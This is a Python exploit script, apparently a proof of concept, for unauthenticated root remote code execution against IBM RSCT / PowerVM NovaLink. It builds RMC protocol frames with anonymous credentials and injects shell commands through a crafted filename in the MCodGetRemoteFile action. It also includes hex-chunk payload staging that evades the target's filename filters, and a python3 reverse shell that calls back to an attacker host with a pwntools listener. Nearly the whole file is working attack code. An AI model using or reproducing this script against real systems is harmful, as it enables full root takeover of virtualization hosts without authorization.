#!/usr/bin/env python3
#  IBM RSCT / PowerVM NovaLink - IBM.HmcGopher::McCodAction (MCodGetRemoteFile)
#  Author: Sean Bales
import argparse, socket, struct, sys, threading, time

MAGIC       = bytes.fromhex("50434d524443")
ACTION_CODE = 0x04000022
CMDNUM_GRF  = 0x32                                        # MCodGetRemoteFile selector
MECHS       = bytes([0x81,0x01, 0,0,0,1, 0,0,0,2])
NULL_CRED   = bytes([0x82,0x02, 0,0,0,0, 0x01,0x01, 0x20,0x0c])   # mech=0 -> anonymous (UNAUTHENT)
CT_INT32, CT_UINT32, CT_CHAR_PTR, CT_BINARY = 2, 3, 8, 9

def _u32(v): return struct.pack("<I", v & 0xffffffff)
def _set(b,o,v): struct.pack_into("<I", b, o, v & 0xffffffff)

def frame(proto, seq, ce):
    h=bytearray(0x20); _set(h,0,0x20+len(ce)); h[4]=proto; h[5]=2; h[6]=1; h[8:0xe]=MAGIC
    _set(h,0x10,seq); _set(h,0x14,0x20); _set(h,0x18,1); _set(h,0x1c,0x20); return bytes(h)+ce

def _locale():
    strs=[b"C.UTF-8\x00"]*6; d0=8+7*4; offs=[]; dat=bytearray()
    for s in strs: offs.append(d0+len(dat)); dat+=s
    offs.append(d0+len(dat)); dat+=_u32(0x2e); blk=bytearray(_u32(0)*2)
    for o in offs: blk+=_u32(o)
    blk+=dat; _set(blk,0,len(blk)); return bytes(blk)

def start_0():
    loc,name=_locale(),b"raven-api\x00\x00\x00\x00"; M=0x60; lo=M; mo=lo+len(loc); no=mo+len(MECHS)
    ce=bytearray(no+len(name)); _set(ce,0,0);_set(ce,4,1);_set(ce,0xc,0);_set(ce,0x10,0xffffffff);_set(ce,0x14,0xffffffff)
    _set(ce,0x20,lo);_set(ce,0x24,len(loc));_set(ce,0x28,mo);_set(ce,0x2c,len(MECHS))
    _set(ce,0x30,0x019c35);_set(ce,0x38,0x6a2d7311);_set(ce,0x40,0x0003fa84)
    _set(ce,0x44,0xc2);_set(ce,0x48,0xffff);_set(ce,0x4c,0x10);_set(ce,0x50,0xffff)
    ce[lo:lo+len(loc)]=loc; ce[mo:mo+len(MECHS)]=MECHS; ce[no:no+len(name)]=name; _set(ce,0,len(ce)); return bytes(ce)

def _simple(cmd, blob):
    ce=bytearray(0x28+len(blob)); _set(ce,4,cmd);_set(ce,0x10,0xffffffff);_set(ce,0x14,0xffffffff);_set(ce,0x1c,0xffffffff)
    _set(ce,0x20,0x28);_set(ce,0x24,len(blob)); ce[0x28:]=blob; _set(ce,0,len(ce)); return bytes(ce)

def _sd(elems):
    n=len(elems); d0=8+n*16; arr=bytearray(); dat=bytearray()
    for t,v in elems:
        if t in (CT_INT32,CT_UINT32): val=_u32(v)+_u32(0)
        else:
            b=(v if isinstance(v,(bytes,bytearray)) else v.encode())
            if t==CT_CHAR_PTR: b=bytes(b)+b"\x00"
            sz=(len(b)+7)&~7; off=d0+len(dat); dat+=bytes(b)+b"\x00"*(sz-len(b)); val=_u32(off)+_u32(sz)
        arr+=_u32(t)+_u32(0)+val
    return bytes(_u32(n)+_u32(0)+bytes(arr)+bytes(dat))

def mccod_getremote(mcip, filename):
    """McCodAction/MCodGetRemoteFile: McIP drives createMcSession; filename hits CreateLocalFile."""
    name,cls=b"McCodAction",b"IBM.HmcGopher"
    fb = filename if isinstance(filename,(bytes,bytearray)) else filename.encode()
    ib = mcip if isinstance(mcip,(bytes,bytearray)) else mcip.encode()
    binblob = struct.pack("<I",6)+b"HELLO\n"                       # CT_BINARY = {u32 len, data}
    sd=_sd([
        (CT_CHAR_PTR,b"RAVEN"),(CT_INT32,CMDNUM_GRF),
        (CT_CHAR_PTR,b"RAVENMTMS"),                                # [2] McMTMS  (len>5 required)
        (CT_CHAR_PTR,ib),                                          # [3] McIP    (len>4; 127.0.0.1)
        (CT_CHAR_PTR,b"CMD"),
        (CT_CHAR_PTR,fb),                                          # [5] fileName -> CreateLocalFile
        (CT_CHAR_PTR,b"x"),(CT_CHAR_PTR,b"a"),(CT_CHAR_PTR,b"b"),
        (CT_UINT32,0),(CT_UINT32,0),(CT_BINARY,binblob),
    ])
    no=0x48+len(sd); co=no+len(name)+1
    tail=bytearray(sd+name+b"\x00"+cls+b"\x00"); tail+=b"\x00"*((-(0x48+len(tail)))%8)
    ce=bytearray(0x48)+tail
    _set(ce,4,ACTION_CODE);_set(ce,0x10,0xffffffff);_set(ce,0x1c,0xffffffff)
    _set(ce,0x14,0x48);_set(ce,0x18,len(sd));_set(ce,0x20,co);_set(ce,0x34,no);_set(ce,0x3c,len(sd))
    _set(ce,0,len(ce)); return bytes(ce)

def _recv(s,dl):
    def rd(n):
        b=b""
        while len(b)<n:
            try: s.settimeout(max(0.05,dl-time.time())); c=s.recv(n-len(b))
            except OSError: break
            if not c: break
            b+=c
        return b
    h=rd(4)
    if len(h)<4: return b""
    n=struct.unpack("<I",h)[0]; return h+(rd(n-4) if 0<n<=0x40000 else b"")

def fire(host, port, mcip, filename):
    chain=[start_0(), _simple(0x2d,MECHS), _simple(0x02,NULL_CRED), mccod_getremote(mcip,filename)]
    s=socket.create_connection((host,port),timeout=8); dl=time.time()+20
    for i,ce in enumerate(chain[:-1]):
        s.sendall(frame(0x10,i+1,ce))
        if not _recv(s,dl): s.close(); sys.exit(f"[-] handshake stalled at step {i}")
    s.sendall(frame(0x10,4,chain[-1])); _recv(s,dl); s.close()

BAD_XFER = ("..","%","/etc","/lib","/opt","/sbin","/bin","/sys","/root","/usr")
# CreateLocalFile builds system("/bin/chmod 666 %s") in a char cmd[100] via snprintf(...,100,...).
# -> the injected filename is truncated past 100-len("/bin/chmod 666 ")-1 = 84 bytes.
FNAME_MAX = 84

def _guard(fn):
    if "/" in fn:
        sys.exit("[-] filename contains '/': it is also the O_CREAT path, so '/' makes open() fail (ENOENT) "
                 "before the sink. Stay relative + use --hex/-s (they stage via a decoder, no '/').")
    bad=[p for p in BAD_XFER if p in fn]
    if bad: sys.exit(f"[-] filename hits validateXferFileName block(s): {bad}")
    if len(fn)>FNAME_MAX:
        sys.exit(f"[-] filename {len(fn)}B > {FNAME_MAX}B snprintf budget -> would be truncated. Shorten it.")
    return fn

def make_filename(cmd):
    # filename = ";<cmd> #"  ->  /bin/sh -c "/bin/chmod 666 ;<cmd> #"  runs <cmd> as root.
    return _guard(";"+cmd+" #")

# --- multi-shot staging: assemble an arbitrary payload (may contain '/') on the target ---------
# Each RCE write is <=84B, so we hex the payload and append it to a scratch file 'h' in chunks,
# then a final write decodes+runs it. Only needs xxd on the target (present on RSCT nodes).
STAGE  = "h"; RUNF = "r"
APPEND_OVH = len(f";printf${{IFS}}>>{STAGE};#")            # per-append fixed cost
CHUNK_HEX  = ((FNAME_MAX-APPEND_OVH)//2)*2                 # even # of hex chars per write

def stage_payload(script):
    h=script.encode().hex(); fns=[]
    for i in range(0,len(h),CHUNK_HEX):
        redir=">" if i==0 else ">>"                        # first write truncates 'h'
        fns.append(_guard(f";printf${{IFS}}{h[i:i+CHUNK_HEX]}{redir}{STAGE};#"))
    # run the staged file with bash (payloads use /dev/tcp + >& ; dash lacks both)
    fns.append(_guard(f";xxd${{IFS}}-r${{IFS}}-p${{IFS}}{STAGE}>{RUNF};bash${{IFS}}{RUNF};#"))
    return fns

def revshell_py(lh, lp):
    # python3 pty reverse shell (python3 is present on RSCT nodes). Staged as hex, so the quotes and
    # slashes are fine. pty.spawn gives a real TTY, so the pwntools side gets a proper interactive shell.
    return ('python3 -c \'import pty,socket,os;s=socket.socket();'
            f's.connect(("{lh}",{lp}));'
            '[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")\'')

def pop_shell(lport, fire_thunk):
    # Built-in listener + interactive shell, so no separate catcher is needed. The staging writes are
    # fired from a daemon thread; the main thread accepts the connect-back and hands you the TTY.
    try:
        from pwn import listen, context
    except ImportError:
        sys.exit("[-] -s needs pwntools:  pip install --break-system-packages pwntools")
    context.log_level = "info"
    l = listen(int(lport))
    threading.Thread(target=fire_thunk, daemon=True).start()
    l.wait_for_connection()
    l.interactive()

if __name__=="__main__":
    ap=argparse.ArgumentParser(description="unauth root RCE via MCodGetRemoteFile+CreateLocalFile")
    ap.add_argument("host"); ap.add_argument("port",nargs="?",type=int,default=657)
    ap.add_argument("--mcip",default="127.0.0.1",help="McIP for createMcSession (127.0.0.1 = target's own rmcd)")
    ap.add_argument("-c",metavar="CMD",help="root command (<=84B, NO '/'; runs relative to RM cwd)")
    ap.add_argument("--script",metavar="SH",help="arbitrary root shell script (any length, may contain '/'); staged via hex chunks + xxd")
    ap.add_argument("-s",metavar="LHOST:LPORT",help="python-pty reverse shell with a built-in pwntools listener; drops you into a root shell")
    a=ap.parse_args()

    def fire_all(fns):
        for i,fn in enumerate(fns):
            tag=f"[{i+1}/{len(fns)}] " if len(fns)>1 else ""
            print(f"[*] {tag}fileName = {fn!r}")
            fire(a.host,a.port,a.mcip,fn)
            if len(fns)>1: time.sleep(0.6)

    if a.s:
        lh,lp=a.s.rsplit(":",1); fns=stage_payload(revshell_py(lh,lp))
        print(f"[*] target {a.host}:{a.port}  McIP={a.mcip}  reverse shell -> {a.s}  ({len(fns)} staged writes, listener built in)")
        pop_shell(lp, lambda: fire_all(fns))
        sys.exit(0)
    elif a.script:
        fns=stage_payload(a.script); print(f"[*] staging script ({len(fns)} writes)")
    elif a.c:
        fns=[make_filename(a.c)]; print(f"[*] root command: {a.c}")
    else:
        fns=[make_filename("id>RCEOUT")]; print("[*] default: id>RCEOUT (writes root id to RM cwd)")
    print(f"[*] target {a.host}:{a.port}  McIP={a.mcip}  ({FNAME_MAX}B/write budget)")
    fire_all(fns)
